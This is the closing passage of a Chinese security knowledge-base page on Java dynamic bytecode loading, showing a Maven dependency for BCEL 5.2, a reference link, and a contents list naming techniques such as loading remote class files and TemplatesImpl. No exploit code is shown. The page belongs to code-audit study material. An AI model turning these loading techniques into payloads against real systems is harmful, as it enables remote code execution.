<p><img decoding="async" loading="lazy" alt="image-20211028112848727" src="/assets/images/image-20211028112848727-12cccf0b68c57ad0588cf2e0fb37e553.png" width="1748" height="292" class="img_ev3q"></p>
<p>所以需要用低于6.0版本的BCEL，换了个06年的5.2</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- https://mvnrepository.com/artifact/org.apache.bcel/bcel --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.bcel</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">bcel</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">5.2</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<p>方法没被遗弃，然后解决了这个问题</p>
<p><img decoding="async" loading="lazy" alt="image-20211028113216521" src="/assets/images/image-20211028113216521-1d983429a690ad5895234c781f9f6fa9.png" width="940" height="150" class="img_ev3q"></p>
<h1>参考</h1>
<ul>
<li><a href="https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener noreferrer">Java安全-Java动态加载字节码方法</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-01T04:26:30.000Z" itemprop="dateModified">2025年6月1日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/代码审计/Java安全/审计基础/IDEA断点调试"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">IDEA断点调试</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/代码审计/Java安全/审计基础/javassist字节码编程"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">javassist字节码编程</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#什么是java字节码" class="table-of-contents__link toc-highlight">什么是Java字节码</a></li><li><a href="#java程序的运行" class="table-of-contents__link toc-highlight">JAVA程序的运行</a></li><li><a href="#字节码如何产生" class="table-of-contents__link toc-highlight">字节码如何产生</a></li><li><a href="#如何看懂字节码" class="table-of-contents__link toc-highlight">如何看懂字节码</a></li><li><a href="#利用urlclassloader加载远程class文件" class="table-of-contents__link toc-highlight">利用URLClassLoader加载远程class文件</a></li><li><a href="#利用classloaderdefineclass加载字节码" class="table-of-contents__link toc-highlight">利用ClassLoader#defineClass加载字节码</a></li><li><a href="#利用templatesimpl加载字节码" class="table-of-contents__link toc-highlight">利用TemplatesImpl加载字节码</a></li><li><a href="#利用unsafedefineclass加载字节码" class="table-of-contents__link toc-highlight">利用Unsafe#defineClass加载字节码</a></li><li><a href="#利用bcel-classloader加载字节码" class="table-of-contents__link toc-highlight">利用BCEL ClassLoader加载字节码</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>